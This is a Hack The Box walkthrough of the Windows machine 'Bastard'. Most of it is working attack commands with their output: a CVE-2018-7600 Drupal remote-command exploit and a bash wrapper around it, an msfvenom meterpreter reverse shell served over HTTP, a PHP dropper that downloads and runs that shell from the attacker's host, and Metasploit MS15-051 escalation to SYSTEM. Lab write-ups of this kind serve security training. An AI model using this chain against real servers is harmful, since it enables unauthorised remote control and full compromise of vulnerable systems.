# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Bastard](https://app.hackthebox.com/machines/Bastard) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Windows                                                |
| 🎯 **Difficulty** | Medium                                                 |
| 📁 **Tags**       | Drupal 7.54, CVE-2018-7600, CVE-2015-1701, Metasploit  |

# Scan
```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

# Attack path
1. [Gain initial foothold by exploiting CVE-2018-7600](#gain-initial-foothold-by-exploiting-cve-2018-7600)
2. [Escalate to `Administrator` user by exploiting CVE-2015-1701](#escalate-to-administrator-user-by-exploiting-cve-2015-1701)

### Gain initial foothold by exploiting [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

#### Enumerate web application to identify Drupal 7 CMS
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ curl -I $TARGET                                                                                                   
HTTP/1.1 200 OK
Cache-Control: no-cache, must-revalidate
Content-Length: 0
Content-Type: text/html; charset=utf-8
Content-Language: en
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Server: Microsoft-IIS/7.5
X-Powered-By: PHP/5.3.28
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
X-Powered-By: ASP.NET
Date: Wed, 19 Nov 2025 05:09:09 GMT
```

#### Access `/CHANGELOG.txt` to identify exact version 
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ curl $TARGET/CHANGELOG.txt 

Drupal 7.54, 2017-02-01
-----------------------
<SNIP>
```

#### Exploit [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600) to execute arbitrary command on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ CMD=$(echo -n "whoami" | jq -sRr @uri) && \
FORM_BUILD_ID=$(curl -s "http://$TARGET?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23markup%5D=$CMD&name%5B%23type%5D=markup" -d 'form_id=user_pass&_triggering_element_name=name' | grep -oP 'form_build_id" value="\Kform-[^"]+') && \
curl -s "http://$TARGET?q=file%2Fajax%2Fname%2F%23value%2F$FORM_BUILD_ID" -d "form_build_id=$FORM_BUILD_ID" | head -n -1
nt authority\iusr
```

#### Encapsulate exploit in bash function
```
cmd() {
    CMD=$(echo -n "$1" | jq -sRr @uri) && \
    FORM_BUILD_ID=$(curl -s "http://$TARGET?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23markup%5D=$CMD&name%5B%23type%5D=markup" -d 'form_id=user_pass&_triggering_element_name=name' | grep -oP 'form_build_id" value="\Kform-[^"]+') && \
    curl -s "http://$TARGET?q=file%2Fajax%2Fname%2F%23value%2F$FORM_BUILD_ID" -d "form_build_id=$FORM_BUILD_ID" | head -n -1
}
```

#### Test function by executing `whoami /all` command
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ cmd 'whoami /all'

USER INFORMATION
----------------

User Name         SID     
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

#### Generate `windows/x64/meterpreter/reverse_tcp` reverse shell and host it over HTTP
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe && \
python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.54:4444
```

#### Download and execute reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Bastard]
└─$ cmd "echo ^<?php file_put_contents('shell.exe', file_get_contents('http://$LHOST/shell.exe')); system('shell.exe'); ?^> > reverse_shell.php" && \ 
curl http://$TARGET/reverse_shell.php
```

#### Confirm foothold gained
```
[*] Sending stage (230982 bytes) to 10.129.103.120
[*] Meterpreter session 1 opened (10.10.16.54:4444 -> 10.129.103.120:49651) at 2025-11-19 17:24:02 +0100

meterpreter > getuid
Server username: NT AUTHORITY\IUSR
```

### Escalate to `Administrator` user by exploiting [CVE-2015-1701](https://nvd.nist.gov/vuln/detail/CVE-2015-1701)

#### Execute Metasploit `windows/local/ms15_051_client_copy_image`
Exploit found with `multi/recon/local_exploit_suggester`.
```
msf exploit(windows/local/ms15_051_client_copy_image) > use windows/local/ms15_051_client_copy_image
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
SESSION => 1
msf exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
LHOST => 10.10.16.54
msf exploit(windows/local/ms15_051_client_copy_image) > set LPORT 5555
LPORT => 5555
msf exploit(windows/local/ms15_051_client_copy_image) > set TARGET 1
TARGET => 1
msf exploit(windows/local/ms15_051_client_copy_image) > set PAYLOAD payload/windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ms15_051_client_copy_image) > run
[*] Started reverse TCP handler on 10.10.16.54:5555 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 872 launched.
[*] Reflectively injecting the DLL into 872...
[*] Sending stage (230982 bytes) to 10.129.103.120
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.16.54:5555 -> 10.129.103.120:49652) at 2025-11-19 17:28:17 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
